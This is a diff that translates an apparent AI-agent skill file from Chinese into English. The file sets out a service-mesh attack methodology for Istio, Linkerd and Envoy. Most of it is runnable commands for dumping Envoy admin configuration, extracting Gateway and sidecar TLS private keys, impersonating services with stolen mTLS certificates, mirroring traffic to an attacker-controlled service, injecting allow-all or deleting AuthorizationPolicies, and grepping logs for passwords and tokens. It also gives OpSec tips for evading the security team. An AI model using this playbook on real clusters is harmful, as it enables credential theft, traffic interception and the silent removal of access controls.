@@ -1,105 +1,107 @@
 ---
 name: servicemesh-tactics
-description: "Service Mesh 攻击方法论（Istio/Linkerd/Envoy）。当目标 Kubernetes 集群部署了 Service Mesh、发现 istio-system/linkerd 命名空间、Envoy Sidecar 注入、或需要利用服务网格进行横向移动时使用。覆盖 Istio 配置窃取、Gateway 攻击、Sidecar 注入滥用、Envoy Admin 接口利用、Service-to-Service 横向移动、Linkerd 攻击、TLS 证书窃取、AuthorizationPolicy 绕过、Telemetry 日志利用"
+description: "Service Mesh attack methodology (Istio/Linkerd/Envoy). Use when the target Kubernetes cluster runs a Service Mesh, when the istio-system/linkerd namespaces are found, when Envoy sidecar injection is present, or when the service mesh is needed for lateral movement. Covers Istio configuration theft, Gateway attacks, sidecar injection abuse, Envoy Admin interface abuse, service-to-service lateral movement, Linkerd attacks, TLS certificate theft, AuthorizationPolicy bypass, and telemetry log abuse."
+zh-signals: "针对 Istio/Linkerd/Envoy 服务网格的攻击方法，覆盖配置窃取、Gateway 攻击与横向移动。信号:服务网格,Istio,Linkerd,Envoy,Sidecar横向移动"
+when-to-use: "Use when a Kubernetes cluster runs a service mesh (istio-system or linkerd namespaces, Envoy sidecars) and you need to abuse mesh configuration, Envoy admin interfaces, or service-to-service traffic for lateral movement."
 metadata:
-  tags: "service-mesh,istio,linkerd,envoy,sidecar,gateway,virtualservice,destinationrule,authorization-policy,横向移动"
+  tags: "service-mesh,istio,linkerd,envoy,sidecar,gateway,virtualservice,destinationrule,authorization-policy,lateral-movement"
   category: "postexploit"
 ---
 
-# Service Mesh 攻击方法论（Istio/Linkerd/Envoy）
+# Service Mesh Attack Methodology (Istio/Linkerd/Envoy)
 
-Service Mesh 将网络通信逻辑下沉到 Sidecar 代理（Envoy/Linkerd-proxy），通过控制面（Istiod/Linkerd Control Plane）统一管理流量路由、mTLS、访问策略。攻击者视角：控制面是整个网格的"大脑"，拿到控制面配置等于掌握全部微服务拓扑；Sidecar 的 Admin 接口默认监听在 localhost，Pod 内即可访问；VirtualService/DestinationRule 等 CRD 控制着流量走向，有 RBAC 权限即可劫持或篡改路由。
+A Service Mesh pushes network communication logic down into sidecar proxies (Envoy/Linkerd-proxy) and centrally manages traffic routing, mTLS, and access policy through the control plane (Istiod/Linkerd Control Plane). From the attacker's perspective: the control plane is the "brain" of the whole mesh, and obtaining control plane configuration means mastering the topology of every microservice; the sidecar Admin interface listens on localhost by default and is reachable from inside the pod; CRDs such as VirtualService/DestinationRule control where traffic flows, so anyone with RBAC permissions can hijack or tamper with routing.
 
-## 深入参考
+## Further Reading
 
-完整的攻击命令、Envoy Admin API 端点清单、TLS 证书提取流程、AuthorizationPolicy 绕过模板：
+Complete attack commands, the Envoy Admin API endpoint list, the TLS certificate extraction flow, and AuthorizationPolicy bypass templates:
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md)
+→ Read [references/attack-techniques.md](references/attack-techniques.md)
 
-## Phase 1: 环境识别
+## Phase 1: Environment Identification
 
-确认 Service Mesh 类型、版本和部署范围，判断攻击面大小。
+Confirm the Service Mesh type, version, and deployment scope to judge the size of the attack surface.
 
-| 检测目标 | 命令 | 确认标志 |
+| Detection Target | Command | Confirmation Signal |
 |---|---|---|
-| Istio 部署 | `kubectl get ns istio-system` | 命名空间存在 |
-| Istio 组件 | `kubectl get pods -n istio-system` | istiod、istio-ingressgateway |
-| Linkerd 部署 | `kubectl get ns linkerd` | 命名空间存在 |
-| Linkerd 组件 | `kubectl get pods -n linkerd` | linkerd-destination、linkerd-proxy-injector |
-| Sidecar 注入标签 | `kubectl get ns --show-labels \| grep injection` | `istio-injection=enabled` |
-| Pod 内 Sidecar | `kubectl get pod POD -o jsonpath='{.spec.containers[*].name}'` | 含 `istio-proxy` 或 `linkerd-proxy` |
-| Istio 版本 | `kubectl get deploy istiod -n istio-system -o jsonpath='{.spec.template.spec.containers[0].image}'` | 版本号影响可用漏洞 |
+| Istio deployment | `kubectl get ns istio-system` | Namespace exists |
+| Istio components | `kubectl get pods -n istio-system` | istiod, istio-ingressgateway |
+| Linkerd deployment | `kubectl get ns linkerd` | Namespace exists |
+| Linkerd components | `kubectl get pods -n linkerd` | linkerd-destination, linkerd-proxy-injector |
+| Sidecar injection labels | `kubectl get ns --show-labels \| grep injection` | `istio-injection=enabled` |
+| Sidecar inside the pod | `kubectl get pod POD -o jsonpath='{.spec.containers[*].name}'` | Contains `istio-proxy` or `linkerd-proxy` |
+| Istio version | `kubectl get deploy istiod -n istio-system -o jsonpath='{.spec.template.spec.containers[0].image}'` | The version determines which known vulnerabilities apply |
 
-**Pod 内快速判断（无 kubectl）：**
+**Quick determination inside a pod (no kubectl):**
 
 ```bash
-# 检查进程
+# Check processes
 ps aux 2>/dev/null | grep -E 'envoy|pilot-agent|linkerd'
 
-# 检查 Envoy Admin 是否可达
+# Check whether the Envoy Admin interface is reachable
 curl -s http://localhost:15000/server_info 2>/dev/null | head -5
 
-# 检查 Linkerd Admin 是否可达
+# Check whether the Linkerd Admin interface is reachable
 curl -s http://localhost:4191/metrics 2>/dev/null | head -5
 
-# 检查 Istio 证书目录
+# Check the Istio certificate directory
 ls -la /etc/certs/ /var/run/secrets/istio/ 2>/dev/null
 ```
 
-## Phase 2: 攻击决策树
+## Phase 2: Attack Decision Tree
 
 ```
-发现 Service Mesh 环境
-├── 在 Pod 内（有 Sidecar）
-│   ├── Envoy Admin 可达（localhost:15000）
-│   │   ├── → Phase 3: 配置 dump / Cluster 枚举 / Listener 枚举
-│   │   └── → Phase 3: 通过 /config_dump 获取全网格拓扑
-│   ├── 通过 Sidecar 代理访问其他服务
-│   │   └── → Phase 5: Service-to-Service 横向移动
-│   └── /etc/certs/ 或 /var/run/secrets/istio/ 存在
-│       └── → Phase 6: 导出 TLS 证书 → 中间人 / 身份伪造
+Service Mesh environment found
+├── Inside a pod (sidecar present)
+│   ├── Envoy Admin reachable (localhost:15000)
+│   │   ├── → Phase 3: config dump / Cluster enumeration / Listener enumeration
+│   │   └── → Phase 3: obtain the full mesh topology via /config_dump
+│   ├── Access other services through the sidecar proxy
+│   │   └── → Phase 5: Service-to-Service lateral movement
+│   └── /etc/certs/ or /var/run/secrets/istio/ exists
+│       └── → Phase 6: export TLS certificates → man-in-the-middle / identity spoofing
 │
-├── 有 K8s RBAC 权限（kubectl 可用）
-│   ├── 可读 VirtualService / DestinationRule
-│   │   └── → Phase 4: 流量路由窃取 / 服务拓扑绘制
-│   ├── 可写 VirtualService / DestinationRule
-│   │   └── → Phase 4: 流量劫持（镜像到攻击者服务 / 修改路由权重）
-│   ├── 可读 Gateway
-│   │   └── → Phase 4: TLS 证书 Secret 提取
-│   ├── 可读/写 AuthorizationPolicy
-│   │   └── → Phase 7: 策略绕过 / 删除策略 / 注入 allow-all
-│   └── 可读 ServiceEntry
-│       └── → Phase 4: 外部服务映射（出口流量分析）
+├── K8s RBAC permissions available (kubectl usable)
+│   ├── Can read VirtualService / DestinationRule
+│   │   └── → Phase 4: traffic routing theft / service topology mapping
+│   ├── Can write VirtualService / DestinationRule
+│   │   └── → Phase 4: traffic hijacking (mirror to an attacker-controlled service / modify route weights)
+│   ├── Can read Gateway
+│   │   └── → Phase 4: TLS certificate Secret extraction
+│   ├── Can read/write AuthorizationPolicy
+│   │   └── → Phase 7: policy bypass / policy deletion / allow-all injection
+│   └── Can read ServiceEntry
+│       └── → Phase 4: external service mapping (egress traffic analysis)
 │
-├── Istio 控制面（istio-system）
-│   ├── Istiod 可达 → xDS API 枚举
-│   ├── IngressGateway 暴露 → 入口攻击面
-│   └── → Phase 4: istio-system 配置全面枚举
+├── Istio control plane (istio-system)
+│   ├── Istiod reachable → xDS API enumeration
+│   ├── IngressGateway exposed → ingress attack surface
+│   └── → Phase 4: full enumeration of the istio-system configuration
 │
-└── Linkerd 控制面（linkerd）
-    ├── linkerd-destination 可达
-    ├── ServiceProfile 枚举
-    └── → Phase 8: Linkerd 特定攻击
+└── Linkerd control plane (linkerd)
+    ├── linkerd-destination reachable
+    ├── ServiceProfile enumeration
+    └── → Phase 8: Linkerd-specific attacks
 ```
 
-## Phase 3: Envoy Admin 接口利用
+## Phase 3: Envoy Admin Interface Abuse
 
-Envoy Admin 默认监听 `localhost:15000`（Istio）或 `localhost:15001`，Pod 内无需认证即可访问。这是 Service Mesh 攻击中最快的信息收集路径。
+The Envoy Admin interface listens on `localhost:15000` (Istio) or `localhost:15001` by default and is reachable from inside the pod without authentication. This is the fastest information-gathering path in a Service Mesh attack.
 
-**关键端点：**
+**Key endpoints:**
 
-| 端点 | 用途 | 攻击价值 |
+| Endpoint | Purpose | Attack Value |
 |---|---|---|
-| `/clusters` | 上游集群列表 | 全部可达微服务地址与端口 |
-| `/config_dump` | 完整 Envoy 配置 | 路由规则、TLS 配置、全网格拓扑 |
-| `/listeners` | 监听器列表 | 入站/出站端口与过滤链 |
-| `/server_info` | Envoy 版本 | 版本对应已知漏洞 |
-| `/stats` | 统计信息 | 流量模式、活跃连接 |
-| `/certs` | TLS 证书信息 | 证书 SAN、有效期、CA 链 |
-| `/ready` | 就绪状态 | 确认 Envoy 运行正常 |
+| `/clusters` | Upstream cluster list | Addresses and ports of every reachable microservice |
+| `/config_dump` | Complete Envoy configuration | Route rules, TLS configuration, full mesh topology |
+| `/listeners` | Listener list | Inbound/outbound ports and filter chains |
+| `/server_info` | Envoy version | The version maps to known vulnerabilities |
+| `/stats` | Statistics | Traffic patterns, active connections |
+| `/certs` | TLS certificate information | Certificate SANs, validity period, CA chain |
+| `/ready` | Readiness state | Confirms Envoy is running normally |
 
 ```bash
-# 核心枚举（Pod 内执行）
+# Core enumeration (run inside the pod)
 curl -s http://localhost:15000/clusters | grep -E "^[a-z]" | head -30
 curl -s http://localhost:15000/config_dump > /tmp/envoy_config.json
 curl -s http://localhost:15000/listeners
@@ -107,10 +109,10 @@ curl -s http://localhost:15000/server_info
 curl -s http://localhost:15000/certs
 ```
 
-**从 config_dump 提取关键信息：**
+**Extract key information from config_dump:**
 
 ```bash
-# 提取所有上游服务地址
+# Extract all upstream service addresses
 cat /tmp/envoy_config.json | python3 -c "
 import sys,json
 d=json.load(sys.stdin)
@@ -121,54 +123,54 @@ for c in d.get('configs',[]):
       if name: print(name)
 " 2>/dev/null
 
-# 简化版：grep 提取服务名
+# Simplified version: extract service names with grep
 grep -oP '"name":\s*"[^"]*svc\.cluster\.local[^"]*"' /tmp/envoy_config.json | sort -u
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整的 Envoy Admin API 利用命令
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete Envoy Admin API abuse commands
 
-## Phase 4: Istio 配置枚举与操控
+## Phase 4: Istio Configuration Enumeration and Manipulation
 
-通过 Istio CRD 了解全网格的流量路由和服务拓扑，有写权限时可劫持流量。
+Use the Istio CRDs to understand the traffic routing and service topology of the whole mesh, and hijack traffic when write access is available.
 
-### 4.1 配置窃取（只读）
+### 4.1 Configuration Theft (Read-Only)
 
 ```bash
-# VirtualService — 路由规则（哪些 URL 路由到哪些服务）
+# VirtualService — routing rules (which URLs route to which services)
 kubectl get virtualservices --all-namespaces -o yaml
 
-# DestinationRule — 负载均衡策略、mTLS 配置
+# DestinationRule — load balancing policy, mTLS configuration
 kubectl get destinationrules --all-namespaces -o yaml
 
-# Gateway — 入口配置、TLS 证书引用
+# Gateway — ingress configuration, TLS certificate references
 kubectl get gateways --all-namespaces -o yaml
 
-# ServiceEntry — 外部服务白名单
+# ServiceEntry — external service allowlist
 kubectl get serviceentries --all-namespaces -o yaml
 
-# AuthorizationPolicy — 访问控制策略
+# AuthorizationPolicy — access control policy
 kubectl get authorizationpolicies --all-namespaces -o yaml
 
-# PeerAuthentication — mTLS 模式（STRICT/PERMISSIVE/DISABLE）
+# PeerAuthentication — mTLS mode (STRICT/PERMISSIVE/DISABLE)
 kubectl get peerauthentication --all-namespaces -o yaml
 ```
 
-### 4.2 Gateway TLS 证书提取
+### 4.2 Gateway TLS Certificate Extraction
 
 ```bash
-# 找到 Gateway 引用的 Secret
+# Find the Secret referenced by the Gateway
 kubectl get gateway -A -o yaml | grep -A 3 "credentialName"
 
-# 提取证书和私钥
+# Extract the certificate and private key
 kubectl get secret CERT_SECRET -n istio-system -o jsonpath='{.data.tls\.crt}' | base64 -d > /tmp/mesh-cert.pem
 kubectl get secret CERT_SECRET -n istio-system -o jsonpath='{.data.tls\.key}' | base64 -d > /tmp/mesh-key.pem
 openssl x509 -in /tmp/mesh-cert.pem -text -noout
 ```
 
-### 4.3 流量劫持（需要写权限）
+### 4.3 Traffic Hijacking (Requires Write Access)
 
 ```bash
-# 镜像流量到攻击者控制的服务（不影响正常流量，隐蔽窃取）
+# Mirror traffic to an attacker-controlled service (does not affect normal traffic, covert theft)
 cat <<'EOF' | kubectl apply -f -
 apiVersion: networking.istio.io/v1beta1
 kind: VirtualService
@@ -189,76 +191,76 @@ spec:
 EOF
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取流量权重篡改和路由劫持模板
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for traffic weight tampering and route hijacking templates
 
-## Phase 5: Service-to-Service 横向移动
+## Phase 5: Service-to-Service Lateral Movement
 
-在 Pod 内通过 Sidecar 代理（或绕过 Sidecar）访问网格中的其他微服务。
+Access other microservices in the mesh from inside a pod, through the sidecar proxy (or bypassing the sidecar).
 
 ```bash
-# 列出所有可达服务（从 Envoy clusters）
+# List all reachable services (from Envoy clusters)
 curl -s http://localhost:15000/clusters | grep -oP '[\w.-]+\.[\w.-]+\.svc\.cluster\.local' | sort -u
 
-# 通过 Sidecar 代理访问目标服务
+# Access the target service through the sidecar proxy
 curl -s http://target-service.target-ns.svc.cluster.local:8080/api/endpoint
 
-# 内部端口探测
+# Internal port probing
 for svc in $(curl -s http://localhost:15000/clusters | grep -oP '[\w.-]+\.[\w.-]+\.svc\.cluster\.local' | sort -u); do
   echo "=== $svc ==="
   curl -s -o /dev/null -w "%{http_code}" "http://$svc/" --connect-timeout 2
 done
 
-# 尝试访问控制面组件
+# Try to reach control plane components
 curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/endpointz
 curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/configz
 ```
 
-## Phase 6: TLS 证书窃取与身份伪造
+## Phase 6: TLS Certificate Theft and Identity Spoofing
 
-Service Mesh 使用 mTLS 进行服务间认证。窃取证书可以伪造服务身份或实施中间人攻击。
+A Service Mesh uses mTLS for service-to-service authentication. Stealing certificates allows impersonating a service identity or performing a man-in-the-middle attack.
 
 ```bash
-# Istio 证书位置（Pod 内）
-ls -la /etc/certs/                          # 旧版 Istio
-ls -la /var/run/secrets/istio/              # 新版 Istio（SDS）
+# Istio certificate locations (inside the pod)
+ls -la /etc/certs/                          # Legacy Istio
+ls -la /var/run/secrets/istio/              # Newer Istio (SDS)
 
-# 提取证书链和私钥
-cat /var/run/secrets/istio/root-cert.pem    # CA 根证书
-cat /var/run/secrets/istio/cert-chain.pem   # 服务证书链
-cat /var/run/secrets/istio/key.pem          # 服务私钥
+# Extract the certificate chain and private key
+cat /var/run/secrets/istio/root-cert.pem    # CA root certificate
+cat /var/run/secrets/istio/cert-chain.pem   # Service certificate chain
+cat /var/run/secrets/istio/key.pem          # Service private key
 
-# 分析证书（提取 SPIFFE ID / 服务身份）
+# Analyze the certificate (extract the SPIFFE ID / service identity)
 openssl x509 -in /var/run/secrets/istio/cert-chain.pem -text -noout | grep -A 1 "Subject Alternative Name"
-# 典型输出: URI:spiffe://cluster.local/ns/NAMESPACE/sa/SERVICE_ACCOUNT
+# Typical output: URI:spiffe://cluster.local/ns/NAMESPACE/sa/SERVICE_ACCOUNT
 
-# 使用窃取的证书访问其他服务（绕过 mTLS 认证）
+# Use the stolen certificate to access other services (bypassing mTLS authentication)
 curl --cert /var/run/secrets/istio/cert-chain.pem \
      --key /var/run/secrets/istio/key.pem \
      --cacert /var/run/secrets/istio/root-cert.pem \
      https://target-service:PORT/
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整的证书利用与身份伪造命令
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete certificate abuse and identity spoofing commands
 
-## Phase 7: AuthorizationPolicy 绕过
+## Phase 7: AuthorizationPolicy Bypass
 
-Istio 的 AuthorizationPolicy 控制服务间的访问权限。攻击目标是削弱或消除这些限制。
+Istio's AuthorizationPolicy controls access permissions between services. The goal is to weaken or eliminate these restrictions.
 
 ```bash
-# 枚举所有策略
+# Enumerate all policies
 kubectl get authorizationpolicies --all-namespaces -o yaml
 
-# 查找宽松策略（ALLOW 无条件）
+# Find permissive policies (unconditional ALLOW)
 kubectl get authorizationpolicies -A -o yaml | grep -B 5 -A 10 "action: ALLOW"
 
-# 查找 PERMISSIVE 模式的 PeerAuthentication（mTLS 非强制）
+# Find PeerAuthentication in PERMISSIVE mode (mTLS not enforced)
 kubectl get peerauthentication -A -o yaml | grep -B 5 "mode: PERMISSIVE"
 ```
 
-**有写权限时——注入 allow-all 策略：**
+**With write access — inject an allow-all policy:**
 
 ```yaml
-# 允许命名空间内所有流量（空 spec = allow all）
+# Allow all traffic in the namespace (empty spec = allow all)
 apiVersion: security.istio.io/v1beta1
 kind: AuthorizationPolicy
 metadata:
@@ -267,79 +269,79 @@ metadata:
 spec: {}
 ```
 
-**有删除权限时——直接移除策略：**
+**With delete access — remove the policy directly:**
 
 ```bash
 kubectl delete authorizationpolicy POLICY_NAME -n TARGET_NAMESPACE
 ```
 
-## Phase 8: Linkerd 特定攻击
+## Phase 8: Linkerd-Specific Attacks
 
 ```bash
-# 枚举 Linkerd 配置
+# Enumerate the Linkerd configuration
 kubectl get configmap -n linkerd -o yaml
 kubectl get serviceprofiles --all-namespaces -o yaml
 
-# Linkerd Proxy Admin（Pod 内）
+# Linkerd Proxy Admin (inside the pod)
 curl -s http://localhost:4191/metrics
 curl -s http://localhost:4191/ready
 
-# Linkerd Dashboard（如果暴露）
+# Linkerd Dashboard (if exposed)
 kubectl port-forward -n linkerd deploy/linkerd-web 8084:8084
-# 访问 http://localhost:8084 查看全网格拓扑和流量
+# Visit http://localhost:8084 to view the full mesh topology and traffic
 
-# Linkerd 证书提取
+# Linkerd certificate extraction
 kubectl get secret -n linkerd | grep -i "tls\|cert\|ca"
 kubectl get secret linkerd-identity-issuer -n linkerd -o yaml
 ```
 
-## Phase 9: Telemetry 与日志利用
+## Phase 9: Telemetry and Log Abuse
 
-Service Mesh 的遥测组件（Prometheus、Jaeger、Kiali）可能暴露敏感的流量数据。
+The telemetry components of a Service Mesh (Prometheus, Jaeger, Kiali) may expose sensitive traffic data.
 
 ```bash
-# 查看 Istio 访问日志（可能包含请求头、路径等敏感信息）
+# View Istio access logs (may contain sensitive information such as request headers and paths)
 kubectl logs -n istio-system deployment/istio-ingressgateway | head -50
 kubectl logs -n TARGET_NS POD_NAME -c istio-proxy | grep -iE "password|secret|token|auth"
 
-# Prometheus（如果可达）
+# Prometheus (if reachable)
 curl -s "http://prometheus.istio-system:9090/api/v1/targets" | head
 curl -s "http://prometheus.istio-system:9090/api/v1/query?query=istio_requests_total"
 
-# Kiali（服务网格可视化）
+# Kiali (service mesh visualization)
 kubectl port-forward -n istio-system deploy/kiali 20001:20001
-# 访问 http://localhost:20001 查看全网格拓扑、流量和配置
+# Visit http://localhost:20001 to view the full mesh topology, traffic, and configuration
 
-# Jaeger（分布式追踪）
+# Jaeger (distributed tracing)
 kubectl port-forward -n istio-system deploy/jaeger 16686:16686
-# 访问 http://localhost:16686 查看请求链路追踪
+# Visit http://localhost:16686 to view request trace chains
 ```
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 | 关键命令 |
+| Tool | Purpose | Key Commands |
 |---|---|---|
-| `kubectl` | K8s 资源操作 | `kubectl get virtualservices -A` |
-| `istioctl` | Istio 专用 CLI | `istioctl analyze`、`istioctl proxy-config` |
-| `curl` | Envoy Admin 接口 | `curl http://localhost:15000/clusters` |
-| `openssl` | 证书分析 | `openssl x509 -in cert.pem -text -noout` |
-| `linkerd` | Linkerd CLI | `linkerd check`、`linkerd viz dashboard` |
-| `tcpdump` | 流量抓取（Pod 内） | `tcpdump -i any -w /tmp/mesh.pcap` |
+| `kubectl` | K8s resource operations | `kubectl get virtualservices -A` |
+| `istioctl` | Istio-specific CLI | `istioctl analyze`, `istioctl proxy-config` |
+| `curl` | Envoy Admin interface | `curl http://localhost:15000/clusters` |
+| `openssl` | Certificate analysis | `openssl x509 -in cert.pem -text -noout` |
+| `linkerd` | Linkerd CLI | `linkerd check`, `linkerd viz dashboard` |
+| `tcpdump` | Traffic capture (inside a pod) | `tcpdump -i any -w /tmp/mesh.pcap` |
 
-## 注意事项
+## Notes
 
-**操作安全：**
-- 修改 VirtualService/DestinationRule 会立即影响线上流量，操作前务必记录原始配置
-- 删除 AuthorizationPolicy 会暴露服务，增加被安全团队发现的风险
-- Envoy Admin 接口的访问不会产生 Istio 审计日志，但 kubectl 操作会被 K8s Audit Log 记录
-- 流量镜像（mirror）是最隐蔽的窃取方式，不影响正常请求响应
+**OpSec:**
+- Modifying a VirtualService/DestinationRule immediately affects production traffic, so always record the original configuration before operating
+- Deleting an AuthorizationPolicy exposes the service and increases the risk of detection by the security team
+- Accessing the Envoy Admin interface produces no Istio audit log, but kubectl operations are recorded in the K8s Audit Log
+- Traffic mirroring is the most covert theft method because it does not affect normal request/response handling
 
-**mTLS 相关：**
-- 如果 PeerAuthentication 为 STRICT 模式，非网格内的流量会被拒绝
-- PERMISSIVE 模式允许明文和 mTLS 混合——可以用明文直接访问服务
-- 窃取的证书有效期通常较短（Istio 默认 24 小时），需要持续获取新证书
+**mTLS-related:**
+- If PeerAuthentication is in STRICT mode, traffic originating outside the mesh is rejected
+- PERMISSIVE mode allows a mix of plaintext and mTLS — services can be accessed directly over plaintext
+- Stolen certificates usually have a short validity period (24 hours by default in Istio), so new certificates must be obtained continuously
 
-**Linkerd vs Istio：**
-- Linkerd 的 Proxy Admin 默认在 4191 端口，功能比 Envoy Admin 少
-- Linkerd 没有 VirtualService/DestinationRule 等 CRD，使用 ServiceProfile 和 TrafficSplit
-- Linkerd 的 identity 证书默认有效期也较短
+**Linkerd vs Istio:**
+- Linkerd's Proxy Admin listens on port 4191 by default and provides fewer features than the Envoy Admin interface
+- Linkerd has no CRDs such as VirtualService/DestinationRule; it uses ServiceProfile and TrafficSplit instead
+- Linkerd's identity certificates also have a short default validity period
